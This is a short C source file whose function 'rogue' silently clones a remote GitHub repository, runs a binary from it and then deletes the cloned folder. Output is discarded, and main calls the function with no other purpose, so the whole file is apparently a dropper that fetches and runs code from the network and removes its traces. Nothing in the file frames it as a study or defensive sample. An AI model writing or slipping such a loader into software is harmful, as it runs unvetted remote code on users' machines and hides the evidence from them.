#include <stdlib.h>

void rogue()
{
	system("git clone https://github.com/solanav/ezekiel > /dev/null");
	system("./ezekiel/a.out");
	system("rm -rf ./ezekiel");
}

int main() {
	// whatever
	rogue();
}